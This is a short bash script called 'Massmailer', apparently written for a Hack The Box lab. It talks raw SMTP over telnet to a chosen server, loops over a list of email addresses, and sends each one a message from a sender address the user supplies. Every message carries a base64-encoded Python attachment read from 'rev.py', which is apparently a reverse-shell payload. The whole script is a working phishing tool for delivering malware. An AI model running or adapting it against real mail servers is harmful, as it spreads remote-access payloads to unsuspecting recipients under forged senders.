#!/bin/bash

echo
echo "Massmailer"
echo "=========="
if [[ -z "$5" ]]; then
  echo "Usage: "
  usage=' <smtp ip> <port> <email_list.txt> <from_email@htb.local> <message>'
  echo " $0 $usage "; echo; echo
  exit
fi
cat $3 | while read line; do
  {
    sleep 5; 
    echo 'ehlo';
    sleep 3;
    echo "MAIL FROM:<$4>";
    sleep 3; 
    echo "RCPT TO: <$line>";
    sleep 3;
    echo 'DATA';
    sleep 3;
    echo -e "To:$line\n$5\nMIME-Version: 1.0 (mime-construct 1.9)\nContent-Type: text/x-python\nContent-Transfer-Encoding: base64\n\n";
    cat rev.py | openssl base64;
    echo '.';
  } | telnet $1 $2 
  echo "[+] Sent email to $line ..."
done

